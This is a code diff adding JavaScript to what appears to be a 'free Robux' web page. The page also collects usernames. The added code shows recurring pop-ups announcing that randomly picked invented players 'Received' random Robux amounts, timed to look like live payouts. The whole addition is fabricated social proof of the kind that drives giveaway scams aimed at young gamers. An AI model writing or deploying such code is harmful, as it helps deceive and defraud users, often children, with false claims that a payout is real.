@@ -234,3 +234,52 @@ document.getElementById('fetch-button').addEventListener('click', () => {
         console.log('Username entered:', username); // Continue with your logic
     }
 });
+
+document.addEventListener('DOMContentLoaded', () => {
+    const popupContainer = document.getElementById('notification-popup');
+
+    const users = [
+        "PlayerOne", "GamerX", "RobloxMaster", "NoobSlayer", "PixelKing",
+        "BuilderPro", "RoboQueen", "DarkShadow", "LightHero", "SpeedRunner",
+        // Add up to 100 random usernames here
+    ];
+
+    const avatars = [
+        "/static/images/RealKreek.png", // Replace with actual avatar URLs
+        "/static/images/Stickmasterluke.png",
+        "/static/images/builderman.png",
+        // Add URLs for 100 avatars
+    ];
+
+    function getRandomPayout() {
+        const username = users[Math.floor(Math.random() * users.length)];
+        const avatar = avatars[Math.floor(Math.random() * avatars.length)];
+        const robux = Math.floor(Math.random() * (10000 - 800 + 1)) + 800;
+        return { username, avatar, robux };
+    }
+
+    function showNotification() {
+        const { username, avatar, robux } = getRandomPayout();
+        popupContainer.innerHTML = `
+            <img src="${avatar}" alt="${username} Avatar">
+            <div class="popup-details">
+                <h4>${username}</h4>
+                <p>Received ${robux} Robux</p>
+            </div>
+        `;
+        popupContainer.style.display = 'flex';
+
+        setTimeout(() => {
+            popupContainer.style.display = 'none';
+        }, 5000); // Hide notification after 5 seconds
+    }
+
+    function scheduleNotifications() {
+        showNotification();
+        const delay = Math.floor(Math.random() * (25000 - 5000 + 1)) + 5000; // Random delay between 5 and 25 seconds
+        setTimeout(scheduleNotifications, delay);
+    }
+
+    scheduleNotifications(); // Start the notification cycle
+});
+
